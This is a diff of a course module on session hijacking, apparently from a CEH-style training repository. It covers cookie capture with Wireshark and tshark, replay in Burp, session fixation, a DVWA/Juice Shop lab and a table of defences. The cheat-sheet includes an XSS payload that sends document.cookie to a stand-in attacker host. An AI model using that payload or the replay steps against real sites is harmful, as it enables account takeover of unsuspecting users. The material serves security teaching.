@@ -1,21 +1,72 @@
-# Module 11 - Session Hijacking
+# Module 11 — Session Hijacking
 
-**In one line.** Steal or fix a user's session, and understand why tokens must expire and rotate.
+> *Steal or forge the token that proves who you are, and you skip the password entirely.*
 
-**Why it matters.** Sessions are the keys to authenticated access - and this ties directly to real web-security research (see CWE-613).
+**The goal.** Understand how sessions are maintained (cookies, tokens), how they're stolen or fixed, and why token handling — expiry, flags, rotation — is one of the most common real-world weaknesses.
 
-**Key concepts.** Session tokens and cookies, fixation, sidejacking, XSS-driven theft, token predictability, Secure/HttpOnly/SameSite flags.
+**Where it fits.** It builds on sniffing (Module 08) and web attacks (Modules 13–14). A stolen session is often the fastest path to a full account takeover.
 
-**Core tools.** Burp Suite, browser developer tools, Wireshark.
+## Concepts that matter
 
-**Practise in your lab.** Capture and replay a session cookie in your lab, then add HttpOnly/Secure and expiration and see what breaks the attack.
+- **Network-level vs application-level.** Network: capture the token in transit (sniffing/MITM). Application: steal it via XSS, or exploit weak generation/handling.
+- **Session fixation.** Force a victim to use a session ID you already know, then ride it after they log in.
+- **Why tokens must expire.** A session that never truly dies on logout is exploitable long after the user thinks they're safe — a subtle, common flaw.
+- **Cookie security flags.** `HttpOnly` (no JS access), `Secure` (HTTPS only), `SameSite` (CSRF defence) — the absence of each is a finding.
 
-**Defender's view.** Short-lived rotating tokens, secure cookie flags, TLS, and re-authentication for sensitive actions.
+## Command cheat-sheet
 
-> New here? Start with the [lab setup guide](../LAB-SETUP.md) and work the modules in order.
+```text
+# --- Capture a token in transit (with Module 08 techniques) ---
+Wireshark filter:  http.cookie        # find Set-Cookie / Cookie headers
+tshark -r cap.pcap -Y http.cookie -T fields -e http.cookie
+
+# --- Steal via XSS (see Module 14) ---
+<script>new Image().src='//attacker/c?'+document.cookie</script>   # if not HttpOnly
+
+# --- Inspect & replay (Burp Suite) ---
+1. Proxy → capture the session cookie
+2. Send a request to Repeater, swap in the stolen cookie
+3. Confirm you're authenticated as the victim
+
+# --- Analyse token quality ---
+Burp Sequencer     # measure session-token randomness/entropy
+# Decode JWTs at jwt.io — check alg, expiry (exp), and signature handling
+```
+
+## Walk it in your lab
+
+Target: **DVWA** / **OWASP Juice Shop**.
+
+1. Log in and capture your session cookie in Burp. Inspect its flags — is it `HttpOnly`, `Secure`, `SameSite`?
+2. Copy the cookie into a separate browser/Repeater session and confirm it grants access — that's a hijack.
+3. **Logout, then replay the old cookie.** Does the server actually invalidate it, or does it still work? (This is the session-expiration flaw worth understanding deeply.)
+4. If the app has XSS, chain it: use a payload to exfiltrate `document.cookie` (only when the cookie lacks `HttpOnly`).
+5. Note every weak flag and every token that outlives its logout.
+
+## What good looks like
+
+Evidence of a captured/replayed session, a verdict on each cookie flag, and — most valuable — a clear test of whether logout genuinely terminates the session server-side.
+
+## Detection & defence
+
+| Weakness | Defence |
+|---|---|
+| Token stealable via JS | `HttpOnly` cookies |
+| Token stealable in transit | `Secure` flag + TLS everywhere |
+| Cross-site request riding | `SameSite=Lax/Strict`; CSRF tokens |
+| Session outlives logout | **Server-side** invalidation on logout + real idle/absolute expiry |
+| Predictable tokens | High-entropy, framework-managed session IDs; rotate on privilege change |
+
+## Common junior mistakes
+
+- Assuming logout works — the interesting bug is when it doesn't. Always test replay-after-logout.
+- Trying to read an `HttpOnly` cookie from JavaScript and concluding "no XSS impact."
+- Reporting a missing flag without demonstrating the impact it enables.
+
+## Go deeper
+
+- OWASP — [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) · WSTG Session Management · CWE-613
 
 ---
 
-*Below: the CY201 class lab submission for this module, produced by its student authors and credited to them.*
-
-# Module11_SessionHijacking\n\n## Instructions\n\nEach group assigned this module must create a folder like this:\n\n- GroupXX/\n  - CEH_ModuleXX_Report_GroupXX.docx\n  - screenshots/\n  - commands.txt\n  - tools-used.txt\n\n📌 Deadline: 15 May 2025\n📌 Submit via Pull Request ONLY\n\nInstructor: Mr. Abdullah Bin Zarshaid\nCourse: CY201 – Spring 2025
+> New here? Start with the **[lab setup guide](../LAB-SETUP.md)** and work the modules in order.
